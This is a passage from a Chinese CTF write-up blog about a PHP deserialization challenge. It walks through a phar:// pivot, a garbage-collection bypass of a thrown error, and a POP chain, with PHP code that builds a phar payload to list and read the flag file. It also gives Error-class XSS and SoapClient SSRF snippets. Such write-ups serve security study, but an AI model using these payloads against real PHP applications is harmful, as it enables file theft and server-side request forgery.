class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;It is file&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You can look at the others&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">banana</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag in /</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]) &lt; <span class="number">55</span>) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;str too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h3 id="首先，反序列化惯例先找找起点（魔术方法destruct和wakeup）和终点（include等可控制参数的危险函数），我们发现air类中有一句echo-new-p-value-（原生类，后面再说），同时这里在D这个类里面发现了两个危险函数file-put-contents和file-get-contents就在destruct里面，可惜有waf函数对参数data的过滤让我们难以直击到flag，waf过滤掉了很多协议和php，让我们无法直接远程文件包含和上传shell，这里就要用到我们题目的提示phar了。"><a href="#首先，反序列化惯例先找找起点（魔术方法destruct和wakeup）和终点（include等可控制参数的危险函数），我们发现air类中有一句echo-new-p-value-（原生类，后面再说），同时这里在D这个类里面发现了两个危险函数file-put-contents和file-get-contents就在destruct里面，可惜有waf函数对参数data的过滤让我们难以直击到flag，waf过滤掉了很多协议和php，让我们无法直接远程文件包含和上传shell，这里就要用到我们题目的提示phar了。" class="headerlink" title="首先，反序列化惯例先找找起点（魔术方法destruct和wakeup）和终点（include等可控制参数的危险函数），我们发现air类中有一句echo new $p($value)（原生类，后面再说），同时这里在D这个类里面发现了两个危险函数file_put_contents和file_get_contents就在destruct里面，可惜有waf函数对参数data的过滤让我们难以直击到flag，waf过滤掉了很多协议和php，让我们无法直接远程文件包含和上传shell，这里就要用到我们题目的提示phar了。"></a>首先，反序列化惯例先找找起点（魔术方法destruct和wakeup）和终点（include等可控制参数的危险函数），我们发现air类中有一句echo new $p($value)（原生类，后面再说），同时这里在D这个类里面发现了两个危险函数file_put_contents和file_get_contents就在destruct里面，可惜有waf函数对参数data的过滤让我们难以直击到flag，waf过滤掉了很多协议和php，让我们无法直接远程文件包含和上传shell，这里就要用到我们题目的提示phar了。</h3><blockquote>
<p>Phar是什么？<br>可以将多个文件组合成一个文件，并按照序列化文件的方式存储，这种文件在文件操作函数中触发phar:&#x2F;&#x2F;协议时会执行反序列化，因此我们可以用phar作为反序列化的跳板</p>
</blockquote>
<p><img src="https://pics.lwzheng.tech/2025/01/25/6793cbc71f2c8.png" alt="5b2cf0a30af8437fe308a0e718c98917.png"></p>
<h3 id="那么这个题我们为什么要用phar作为跳板呢，这是因为主函数的反序列化对参数的长度有限制，如果想直接利用echo-new-p-value-的话需要进行嵌套类的生成，会超出长度，所以我们要利用phar作为反序列化的跳板，利用file-put-contents写入phar，利用file-get-contents触发利用echo-new-p-value-的pop链反序列化"><a href="#那么这个题我们为什么要用phar作为跳板呢，这是因为主函数的反序列化对参数的长度有限制，如果想直接利用echo-new-p-value-的话需要进行嵌套类的生成，会超出长度，所以我们要利用phar作为反序列化的跳板，利用file-put-contents写入phar，利用file-get-contents触发利用echo-new-p-value-的pop链反序列化" class="headerlink" title="那么这个题我们为什么要用phar作为跳板呢，这是因为主函数的反序列化对参数的长度有限制，如果想直接利用echo new $p($value)的话需要进行嵌套类的生成，会超出长度，所以我们要利用phar作为反序列化的跳板，利用file_put_contents写入phar，利用file_get_contents触发利用echo new $p($value)的pop链反序列化"></a>那么这个题我们为什么要用phar作为跳板呢，这是因为主函数的反序列化对参数的长度有限制，如果想直接利用echo new $p($value)的话需要进行嵌套类的生成，会超出长度，所以我们要利用phar作为反序列化的跳板，利用file_put_contents写入phar，利用file_get_contents触发利用echo new $p($value)的pop链反序列化</h3><h3 id="不过在尝试性传入几个参数时发现网页最后一直报错，这才注意到最后的一句throw-new-Error-“start”-，这句话的作用就是抛出一个错误，而代码在遇到这个错误时便不再进行，进而导致我们的魔术方法destruct和wakeup无法触发，所以我们要在代码抛出错误之前将我们反序列化的类回收掉，这便是GC（垃圾处理机制）"><a href="#不过在尝试性传入几个参数时发现网页最后一直报错，这才注意到最后的一句throw-new-Error-“start”-，这句话的作用就是抛出一个错误，而代码在遇到这个错误时便不再进行，进而导致我们的魔术方法destruct和wakeup无法触发，所以我们要在代码抛出错误之前将我们反序列化的类回收掉，这便是GC（垃圾处理机制）" class="headerlink" title="不过在尝试性传入几个参数时发现网页最后一直报错，这才注意到最后的一句throw new Error(“start”);，这句话的作用就是抛出一个错误，而代码在遇到这个错误时便不再进行，进而导致我们的魔术方法destruct和wakeup无法触发，所以我们要在代码抛出错误之前将我们反序列化的类回收掉，这便是GC（垃圾处理机制）"></a>不过在尝试性传入几个参数时发现网页最后一直报错，这才注意到最后的一句throw new Error(“start”);，这句话的作用就是抛出一个错误，而代码在遇到这个错误时便不再进行，进而导致我们的魔术方法destruct和wakeup无法触发，所以我们要在代码抛出错误之前将我们反序列化的类回收掉，这便是GC（垃圾处理机制）</h3><blockquote>
<p>__destruct（析构函数）当某个对象成为垃圾或者当对象被显式销毁时执行<br>显式销毁，当对象没有被引用时就会被销毁,所以我们可以unset或为其赋值NULL<br>隐式销毁，PHP是脚本语言,在代码执行完最后一行时,所有申请的内存都要释放掉</p>
</blockquote>
<h3 id="这里我们可以利用将数组的第一个元素设置为我们想要回收的对象，第二个元素设置为0，再进行序列化得到一串形如a-2-i-0-O-1-B-0-i-1-i-0-的字符串，详细说明一下这里面的值对应的含义：包含2个元素的数组-序号为0元素是B类的对象，长度为0：-没有元素-；序号为1的元素是int型变量值为0-，这里我们就可以将序号1改为序号0，形成a-2-i-0-O-1-B-0-i-0-i-0-，这样就导致序号为1的元素变为了null，触发GC，这样就可以绕过throw-new-Error-“start”-了"><a href="#这里我们可以利用将数组的第一个元素设置为我们想要回收的对象，第二个元素设置为0，再进行序列化得到一串形如a-2-i-0-O-1-B-0-i-1-i-0-的字符串，详细说明一下这里面的值对应的含义：包含2个元素的数组-序号为0元素是B类的对象，长度为0：-没有元素-；序号为1的元素是int型变量值为0-，这里我们就可以将序号1改为序号0，形成a-2-i-0-O-1-B-0-i-0-i-0-，这样就导致序号为1的元素变为了null，触发GC，这样就可以绕过throw-new-Error-“start”-了" class="headerlink" title="这里我们可以利用将数组的第一个元素设置为我们想要回收的对象，第二个元素设置为0，再进行序列化得到一串形如a:2{i:0;O:1:&quot;B&quot;:0:{}i:1;i:0;}的字符串，详细说明一下这里面的值对应的含义：包含2个元素的数组{序号为0元素是B类的对象，长度为0：{没有元素}；序号为1的元素是int型变量值为0}，这里我们就可以将序号1改为序号0，形成a:2{i:0;O:1:&quot;B&quot;:0:{}i:0;i:0;}，这样就导致序号为1的元素变为了null，触发GC，这样就可以绕过throw new Error(“start”);了"></a>这里我们可以利用将数组的第一个元素设置为我们想要回收的对象，第二个元素设置为0，再进行序列化得到一串形如<code>a:2&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;i:0;&#125;</code>的字符串，详细说明一下这里面的值对应的含义：包含2个元素的数组{序号为0元素是B类的对象，长度为0：<code>&#123;没有元素&#125;</code>；序号为1的元素是int型变量值为0}，这里我们就可以将序号1改为序号0，形成<code>a:2&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:0;i:0;&#125;</code>，这样就导致序号为1的元素变为了null，触发GC，这样就可以绕过throw new Error(“start”);了</h3><h3 id="接下来就可以去构造phar了，phar八股文："><a href="#接下来就可以去构造phar了，phar八股文：" class="headerlink" title="接下来就可以去构造phar了，phar八股文："></a>接下来就可以去构造phar了，phar八股文：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<h3 id="这里的-o便是我们正常要序列化的类，在生成phar时会自动序列化，在这一段代码上面放上我们想反序列化的类并构造pop链，便可以在file-get-contents时进行反序列化了，所以我们还要先构造终点为echo-new-p-value-的pop链"><a href="#这里的-o便是我们正常要序列化的类，在生成phar时会自动序列化，在这一段代码上面放上我们想反序列化的类并构造pop链，便可以在file-get-contents时进行反序列化了，所以我们还要先构造终点为echo-new-p-value-的pop链" class="headerlink" title="这里的$o便是我们正常要序列化的类，在生成phar时会自动序列化，在这一段代码上面放上我们想反序列化的类并构造pop链，便可以在file_get_contents时进行反序列化了，所以我们还要先构造终点为echo new $p($value)的pop链"></a>这里的<code>$</code>o便是我们正常要序列化的类，在生成phar时会自动序列化，在这一段代码上面放上我们想反序列化的类并构造pop链，便可以在file_get_contents时进行反序列化了，所以我们还要先构造终点为echo new $p($value)的pop链</h3><blockquote>
<p>__cal:在对象中调用一个不可访问方法时调用<br>__get()，获得一个类的成员变量时调用<br>__set()，设置一个类的成员变量时调用</p>
</blockquote>
<h3 id="首先我们先了解一下原生类"><a href="#首先我们先了解一下原生类" class="headerlink" title="首先我们先了解一下原生类"></a>首先我们先了解一下原生类</h3><blockquote>
<p>在CTF题目中，可以利用php原生类来进行XSS,反序列化，SSRF，XXE和读文件的思路<br>1.利用Error&#x2F;Exception 内置类进行 XSS</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>); </span><br></pre></td></tr></table></figure>
<p>如果题目有反序列化但没有其他危险函数可以利用这一段函数，会直接弹出xss<br>2.利用SoapClient来进行SSRF</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000/aaa&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br></pre></td></tr></table></figure>
<p>3.遍历文件目录的类<br>DirectoryIterator 类和FilesystemIterator 类(配合glob:&#x2F;&#x2F;协议使用模式匹配来寻找我们想要的文件路径)<br>GlobIterator 类（行为类似于 glob()，可以通过模式匹配来寻找文件路径，也就是不用写glob协议）<br>4.文件读取的类<br>SplFileObject 类（读取第一行）</p>
<h3 id="题目给了我们flag在-，所以我们可以利用先遍历后读取的方式获得flag"><a href="#题目给了我们flag在-，所以我们可以利用先遍历后读取的方式获得flag" class="headerlink" title="题目给了我们flag在&#x2F;，所以我们可以利用先遍历后读取的方式获得flag"></a>题目给了我们flag在&#x2F;，所以我们可以利用先遍历后读取的方式获得flag</h3><h3 id="接下来就是找pop链了，最后要到air类的-set，所以我们要定义air类里面的变量，也就是找等号左边有多个箭头的，正好apple的-get满足条件，所以我们将-this-xxx-flag-this-flag-这里面的xxx定义为air类即可"><a href="#接下来就是找pop链了，最后要到air类的-set，所以我们要定义air类里面的变量，也就是找等号左边有多个箭头的，正好apple的-get满足条件，所以我们将-this-xxx-flag-this-flag-这里面的xxx定义为air类即可" class="headerlink" title="接下来就是找pop链了，最后要到air类的__set，所以我们要定义air类里面的变量，也就是找等号左边有多个箭头的，正好apple的__get满足条件，所以我们将$this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag; 这里面的xxx定义为air类即可"></a>接下来就是找pop链了，最后要到air类的__set，所以我们要定义air类里面的变量，也就是找等号左边有多个箭头的，正好apple的__get满足条件，所以我们将$this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag; 这里面的xxx定义为air类即可</h3><h3 id="然后就是触发-get了，我们要调用成员变量，所以找等号右边带多个等号的，tree的-call里面有，air类的-set也有，但air类的-set是我们的终点，所以是利用tree的-call，所以我们要将-arg-1-this-name-name里面的name设置为apple类"><a href="#然后就是触发-get了，我们要调用成员变量，所以找等号右边带多个等号的，tree的-call里面有，air类的-set也有，但air类的-set是我们的终点，所以是利用tree的-call，所以我们要将-arg-1-this-name-name里面的name设置为apple类" class="headerlink" title="然后就是触发__get了，我们要调用成员变量，所以找等号右边带多个等号的，tree的__call里面有，air类的__set也有，但air类的__set是我们的终点，所以是利用tree的__call，所以我们要将$arg[1] &#x3D;$this-&gt;name-&gt;$name里面的name设置为apple类"></a>然后就是触发__get了，我们要调用成员变量，所以找等号右边带多个等号的，tree的__call里面有，air类的__set也有，但air类的__set是我们的终点，所以是利用tree的__call，所以我们要将$arg[1] &#x3D;$this-&gt;name-&gt;$name里面的name设置为apple类</h3><h3 id="最后就是tree的tree的-call的触发了，要在对象中调用一个不可访问方法时调用，也就是找个带括号的，刚好tree的-destruct就有，所以我们将name定义为一个未定义的函数即可，正好刚刚我们要将name定义为对象，这样链子就找到了"><a href="#最后就是tree的tree的-call的触发了，要在对象中调用一个不可访问方法时调用，也就是找个带括号的，刚好tree的-destruct就有，所以我们将name定义为一个未定义的函数即可，正好刚刚我们要将name定义为对象，这样链子就找到了" class="headerlink" title="最后就是tree的tree的__call的触发了，要在对象中调用一个不可访问方法时调用，也就是找个带括号的，刚好tree的__destruct就有，所以我们将name定义为一个未定义的函数即可，正好刚刚我们要将name定义为对象，这样链子就找到了"></a>最后就是tree的tree的__call的触发了，要在对象中调用一个不可访问方法时调用，也就是找个带括号的，刚好tree的__destruct就有，所以我们将name定义为一个未定义的函数即可，正好刚刚我们要将name定义为对象，这样链子就找到了</h3><h2 id="tree的-destruct-tree的-call-apple的-get-air类的-set"><a href="#tree的-destruct-tree的-call-apple的-get-air类的-set" class="headerlink" title="tree的__destruct-&gt;tree的__call-&gt;apple的__get-&gt;air类的__set"></a><code>tree的__destruct-&gt;tree的__call-&gt;apple的__get-&gt;air类的__set</code></h2><h3 id="然后就是最终参数的确定，我们要执行DirectoryIterator（glob-f-），所以-set-p-value-里面的-p要为DirectoryIterator，-value要为glob-f-，同时又因为-p-this-p-act-，所以我们还要定义一个air类来将p定义为唯一一个有act元素的类tree，然后将调用set时设定的值也就是-this-xxx-flag-this-flag-里面的flag设置为glob-f-，文件读取时改DirectoryIterator为SplFileObject，glob-f-为文件名即可"><a href="#然后就是最终参数的确定，我们要执行DirectoryIterator（glob-f-），所以-set-p-value-里面的-p要为DirectoryIterator，-value要为glob-f-，同时又因为-p-this-p-act-，所以我们还要定义一个air类来将p定义为唯一一个有act元素的类tree，然后将调用set时设定的值也就是-this-xxx-flag-this-flag-里面的flag设置为glob-f-，文件读取时改DirectoryIterator为SplFileObject，glob-f-为文件名即可" class="headerlink" title="然后就是最终参数的确定，我们要执行DirectoryIterator（glob:&#x2F;&#x2F;f*），所以__set($p, $value)里面的$p要为DirectoryIterator，$value要为glob:&#x2F;&#x2F;f*，同时又因为$p &#x3D; $this-&gt;p-&gt;act; ，所以我们还要定义一个air类来将p定义为唯一一个有act元素的类tree，然后将调用set时设定的值也就是$this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag; 里面的flag设置为glob:&#x2F;&#x2F;f*，文件读取时改DirectoryIterator为SplFileObject，glob:&#x2F;&#x2F;f*为文件名即可"></a>然后就是最终参数的确定，我们要执行DirectoryIterator（glob:&#x2F;&#x2F;f*），所以__set($p, $value)里面的$p要为DirectoryIterator，$value要为glob:&#x2F;&#x2F;f*，同时又因为$p &#x3D; $this-&gt;p-&gt;act; ，所以我们还要定义一个air类来将p定义为唯一一个有act元素的类tree，然后将调用set时设定的值也就是$this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag; 里面的flag设置为glob:&#x2F;&#x2F;f*，文件读取时改DirectoryIterator为SplFileObject，glob:&#x2F;&#x2F;f*为文件名即可</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">air</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">apple</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;xxx=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;flag=<span class="string">&quot;glob://f*&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;act=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;p=<span class="variable">$d</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pics.lwzheng.tech/2025/01/25/6793cbf767c29.png" alt="d4f41f554930fa7a1780893a3bc7c4a7.png"></p>
<h3 id="这里为了防止找pop链出现错误导致后面出错所以先自己搭了一个部分环境检验了一下"><a href="#这里为了防止找pop链出现错误导致后面出错所以先自己搭了一个部分环境检验了一下" class="headerlink" title="这里为了防止找pop链出现错误导致后面出错所以先自己搭了一个部分环境检验了一下"></a>这里为了防止找pop链出现错误导致后面出错所以先自己搭了一个部分环境检验了一下</h3><p><img src="https://pics.lwzheng.tech/2025/01/25/6793cc125afa9.png" alt="f152f0f00e2bf2a376a73ed7ff6536e8.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">air</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">apple</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;xxx=<span class="variable">$a</span>;</span><br><span class="line"><span class="comment">#$b-&gt;flag=&quot;glob:///*f*&quot;;</span></span><br><span class="line"><span class="variable">$b</span>-&gt;flag=<span class="string">&quot;/fflaggg&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="comment">#$d-&gt;act=&quot;FilesystemIterator&quot;;</span></span><br><span class="line"><span class="variable">$d</span>-&gt;act=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;p=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt; ?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件,随便新建一个文件内容随意</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//生成后删除最后一个&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="生成phar后还要注意我们要让phar的反序列化也能绕过throw-new-Error-“start”-，所以要用010打开去掉最后一个-来触发GC（不太理解，网上的WP也少有解释）但是phar文件内还有签名，我们改动后会导致签名不符，所以我们要重新生成一次签名"><a href="#生成phar后还要注意我们要让phar的反序列化也能绕过throw-new-Error-“start”-，所以要用010打开去掉最后一个-来触发GC（不太理解，网上的WP也少有解释）但是phar文件内还有签名，我们改动后会导致签名不符，所以我们要重新生成一次签名" class="headerlink" title="生成phar后还要注意我们要让phar的反序列化也能绕过throw new Error(“start”)，所以要用010打开去掉最后一个}来触发GC（不太理解，网上的WP也少有解释）但是phar文件内还有签名，我们改动后会导致签名不符，所以我们要重新生成一次签名"></a>生成phar后还要注意我们要让phar的反序列化也能绕过throw new Error(“start”)，所以要用010打开去掉最后一个}来触发GC（不太理解，网上的WP也少有解释）但是phar文件内还有签名，我们改动后会导致签名不符，所以我们要重新生成一次签名</h3><h3 id="这里有一个卡了我一天的地方，网上的脚本几乎全是sha1加密生成签名，但是实际上在php官网上有详细介绍phar的签名机制，可以有MD5，sha1，sha256，sha512不同的签名方式，同时在文件的倒数5到8个字节逆向分别用0x0001，0x0002-0x0003-0x0004代指对应的签名方法，可能是版本迭代的原因，我们生成的phar为03，也就是sha256加密，这样就导致我们的脚本与我们的文件加密方式不同，导致签名损坏。"><a href="#这里有一个卡了我一天的地方，网上的脚本几乎全是sha1加密生成签名，但是实际上在php官网上有详细介绍phar的签名机制，可以有MD5，sha1，sha256，sha512不同的签名方式，同时在文件的倒数5到8个字节逆向分别用0x0001，0x0002-0x0003-0x0004代指对应的签名方法，可能是版本迭代的原因，我们生成的phar为03，也就是sha256加密，这样就导致我们的脚本与我们的文件加密方式不同，导致签名损坏。" class="headerlink" 